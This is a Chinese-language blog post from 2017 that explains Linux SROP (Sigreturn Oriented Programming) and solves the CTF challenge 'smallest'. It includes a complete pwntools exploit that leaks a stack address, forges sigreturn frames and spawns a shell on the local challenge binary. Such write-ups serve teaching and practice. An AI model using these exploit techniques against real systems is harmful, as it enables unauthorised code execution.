---
title: Linux SROP 原理与攻击
tags: [Linux]
date: 2017-06-30 01:34
---
理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章<a href="http://www.freebuf.com/articles/network/87447.html">http://www.freebuf.com/articles/network/87447.html</a>，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。</p>
</blockquote>
<h1 id="0x01-原理">0x01 原理</h1>
<blockquote>
<p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。</p>
<p>Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p>
<p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p>
</blockquote>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630004342751?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>在这里我们主要理解sigreturn的意义是，去执行一段pop函数将堆栈中的值全部pop到寄存器中，相当于一个恢复现场的作用（攻击的时候主要运用的这一点）。</p>
<p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例： <br>
在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>： <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630011456220?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
我们将这段内存称为一个<code>Signal Frame</code>。</br></img></br></br></p>
<h1 id="0x02-攻击利用">0x02 攻击利用</h1>
<h2 id="0x1攻击流程">0x1攻击流程</h2>
<p>如果理解了前面所描述的原理，那么利用方式很简单，直接篡改在堆栈中的数据，等到sigreturn的时候就可以大展伸手了。 <br>
攻击利用这一点 swing师傅已经写了<a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/">传送门</a></br></p>
<h2 id="0x2-题目解析">0x2 题目解析</h2>
<p>在这里我主要分析一道ctf题目，i春秋360比赛的<strong>smallest</strong> <br>
拿到题目首先分析结构 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630012948485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
三无产品 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630013035130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></br></p>
<p>这里看到syscall，就想到用SROP技术</p>
<p>syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。 <br>
<code>syscall(rax,rdi,rsi,rdx)</code> <br>
我们看看反汇编代码的意思 <br>
<code>syscall(0,0,$rsp,0x400)</code>，相当于调用了read函数<code>read(0,$rsp,0x400)</code></br></br></br></p>
<h3 id="1-target">1. target</h3>
<p>我们要最终获取shell权限，必须有写入<code>"/bin/bash"</code>的过程所以要用到read函数。 <br>
要有命令执行过程所以要有exec <br>
要有固定的字符串地址所以要有地址泄露 这里是write函数</br></br></p>
<ol>
<li>因为write函数的系统调用编号是1所以可以直接跳转绕过<code>xor ax，ax</code> <br>
使得第二次函数执行write函数</br></li>
<li>下面需要frame结构写到栈里，但最后要调用sigreturn指令，所以这里要提前做好栈保留的工作，这里有个坑看了半天才看懂，最后的解释感觉还可以接受</li>
</ol>
<p>其他的工作倒没什么了，主要是理清思路，要知道代码中每一行是干什么的</p>
<h3 id="2write函数地址泄露">2.write函数地址泄露</h3>
<p>这里我们选用write函数的原因很简单就是因为系统调用ax=1时是write函数，所以这里选用它 <br>
代码如下</br></p>
<pre class="prettyprint"><code class=" hljs sql">from pwn import *
sh = process("./pwn4")

<span class="hljs-operator"><span class="hljs-keyword">begin</span> = <span class="hljs-number">0x4000b0</span>
syscall = <span class="hljs-number">0x4000be</span>
# step <span class="hljs-number">1</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func <span class="hljs-keyword">to</span> leak stack addr
write_payload = p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) #the sec place can be replaced <span class="hljs-keyword">by</span> <span class="hljs-number">0x4000b1</span> <span class="hljs-number">0x4000b2</span> why <span class="hljs-number">3</span> addr becaus  <span class="hljs-keyword">after</span> <span class="hljs-keyword">write</span> it went <span class="hljs-keyword">to</span> <span class="hljs-keyword">read</span> func
sh.send(write_payload)

sh.send(<span class="hljs-string">"\xb3"</span>)#attention can <span class="hljs-keyword">only</span> send <span class="hljs-number">1</span> byte <span class="hljs-keyword">to</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func
stack_addr = u64(sh.recv()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
print hex(stack_addr)
sh.interactive()</span></code></pre>
<h2 id="3构造frame结构">3.构造frame结构</h2>
<p>这一步比较简单可以直接利用别人写好的框架SigreturnFrame <br>
首先我们要构造一个read函数，作用是把我们输入的字符串放在已经泄露的栈地址上，这一步是为了写exec的frame和参数<code>/bin/bash</code></br></p>
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span>
frame = SigreturnFrame(kernel=<span class="hljs-string">"amd64"</span>)
frame = SigreturnFrame(kernel=<span class="hljs-string">"amd64"</span>)
frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read
frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span>
frame<span class="hljs-preprocessor">.rsi</span> = stack_addr<span class="hljs-preprocessor">#这里和下面@值必须相同，因为是一个rop链</span>
frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span>
frame<span class="hljs-preprocessor">.rsp</span> = stack_addr<span class="hljs-preprocessor">#@</span>
frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre>
<pre class="prettyprint"><code class=" hljs avrasm">frame = SigreturnFrame(kernel=<span class="hljs-string">"amd64"</span>)
frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve
frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span> <span class="hljs-preprocessor"># "/bin/sh" 's addr </span>
frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre>
<h2 id="4sigreturn执行">4.sigreturn执行</h2>
<p>这里需要前面的的预留位</p>
<pre class="prettyprint"><code class=" hljs livecodeserver">goto_sigreturn_payload = p64(syscall_addr) + <span class="hljs-string">"\x00"</span>*(<span class="hljs-number">15</span> - <span class="hljs-number">8</span>) <span class="hljs-comment"># sigreturn syscall is 15 </span>
s.<span class="hljs-built_in">send</span>(goto_sigreturn_payload)</code></pre>
<p>第一个是注册ax然后rop到syscall那里去执行sigreturn，恢复现场 <br>
下面那个和这个功能一样</br></p>
<h2 id="5完整exp">5.完整exp</h2>
<pre class="prettyprint"><code class=" hljs http">

<span class="avrasm">from pwn import *
sh = process(<span class="hljs-string">"./pwn4"</span>)
context<span class="hljs-preprocessor">.arch</span> = <span class="hljs-string">"amd64"</span>
begin = <span class="hljs-number">0x4000b0</span>
syscall = <span class="hljs-number">0x4000be</span>
<span class="hljs-preprocessor"># step 1 call write func to leak stack addr</span>
write_payload = p64(begin) + p64(begin) + p64(begin) <span class="hljs-preprocessor">#the sec place can be replaced by 0x4000b1 0x4000b2 why 3 addr becaus  after write it went to read func</span>
sh<span class="hljs-preprocessor">.send</span>(write_payload)

sh<span class="hljs-preprocessor">.send</span>(<span class="hljs-string">"\xb3"</span>)<span class="hljs-preprocessor">#attention can only send 1 byte to call write func</span>
stack_addr = u64(sh<span class="hljs-preprocessor">.recv</span>()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
print <span class="hljs-string">"stack_addr:"</span>,hex(stack_addr)

<span class="hljs-preprocessor"># step 2 create frame struct</span>
<span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span>

frame = SigreturnFrame(kernel=<span class="hljs-string">"amd64"</span>)
frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read
frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span>
frame<span class="hljs-preprocessor">.rsi</span> = stack_addr
frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span>
frame<span class="hljs-preprocessor">.rsp</span> = stack_addr
frame<span class="hljs-preprocessor">.rip</span> = syscall

read_payload = p64(begin)+p64(<span class="hljs-number">11111</span>)+str(frame)
sh<span class="hljs-preprocessor">.send</span>(read_payload)
<span class="hljs-preprocessor">#step 3 excu sigreturn </span>
sigreturn_payload = p64(syscall)+<span class="hljs-number">7</span>*<span class="hljs-string">"\x00"</span>
sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)

<span class="hljs-preprocessor">#step 4 create frame struct</span>
frame = SigreturnFrame(kernel=<span class="hljs-string">"amd64"</span>)
frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve
frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span>
frame<span class="hljs-preprocessor">.rip</span> = syscall

execv_frame_payload = p64(begin) + p64(<span class="hljs-number">1111</span>) + str(frame)
<span class="hljs-preprocessor">#step 5 excu sigreturn </span>
execv_frame_payload_all = execv_frame_payload + (<span class="hljs-number">0x300</span> - len(execv_frame_payload))*<span class="hljs-string">"\x00"</span> + <span class="hljs-string">"/bin/sh\x00"</span>
sh<span class="hljs-preprocessor">.send</span>(execv_frame_payload_all)

sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)  

sh<span class="hljs-preprocessor">.interactive</span>()</span></code></pre></div>